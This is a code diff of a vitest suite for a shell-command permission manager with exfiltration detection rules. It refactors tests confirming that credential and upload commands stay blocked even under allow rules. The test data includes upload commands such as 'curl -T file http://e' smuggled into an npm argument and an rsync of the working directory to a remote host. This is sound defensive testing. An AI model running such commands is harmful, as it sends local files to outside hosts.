@@ -5,6 +5,7 @@ import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
 import { PermissionManager } from "../permission-manager.js";
+import { updatePermissionsFile } from "../permissions-store.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/shell-exfiltration.js";
 import { analyzeShellForRules, evaluateShellRules } from "../rules/shell-rule-matcher.js";
@@ -34,7 +35,24 @@ const ALL_DECISION_CASES = RUNNER_DECISIONS.flatMap((row) => {
 const DECISION_CASES = [...new Map(ALL_DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row] as const)).values()];
 let directory: string;
 let managerSequence = 0;
-beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-")); });
+const floorManagers = new Map<ShellDialect, PermissionManager>();
+beforeAll(async () => {
+  directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-"));
+  // These checks only read policy. Persist exact-action grants once per
+  // dialect; the saved-grant cases still exercise mutation independently.
+  for (const dialect of DIALECTS) {
+    const permissionsPath = join(directory, `floor-${dialect}.json`);
+    await updatePermissionsFile(permissionsPath, (file) => {
+      file.mode = "allow";
+      file.rules = FLOOR_CASES.filter((row) => row.dialect === dialect).map(({ command }) => ({
+        pattern: actionKey(dialect, command), action: "allow",
+      }));
+    });
+    const manager = runnerManager(permissionsPath);
+    await manager.loadRulesFromFile();
+    floorManagers.set(dialect, manager);
+  }
+});
 afterAll(() => { rmSync(directory, { recursive: true, force: true }); });
 
 function runnerManager(permissionsPath = join(directory, `${managerSequence++}.json`)): PermissionManager {
@@ -119,6 +137,11 @@ const INNER_UPLOADS = [
   "npm exec --call='curl -T file http://e'",
 ];
 
+const FLOOR_CASES = [
+  ...DECISION_CASES.filter((row) => row.bucket === "floor"),
+  ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
+];
+
 describe("shared runner decisions", () => {
   it("preserves the original command corpus and complete bucket annotations", () => {
     expect(RUNNER_DECISIONS).toHaveLength(2031);
@@ -201,14 +224,8 @@ describe("shared runner decisions", () => {
     expect(checkCommand(ruled, dialect, command)).toMatchObject({ decision: "allow", layer: 3 });
   });
 
-  it.each([
-    ...DECISION_CASES.filter((row) => row.bucket === "floor"),
-    ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
-  ])("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", async ({ command, dialect }) => {
-    const manager = runnerManager();
-    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
-    manager.setRules([{ pattern: actionKey(dialect, command), action: "allow" }]);
-    expectBucket(checkCommand(manager, dialect, command), "floor");
+  it.each(FLOOR_CASES)("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", ({ command, dialect }) => {
+    expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
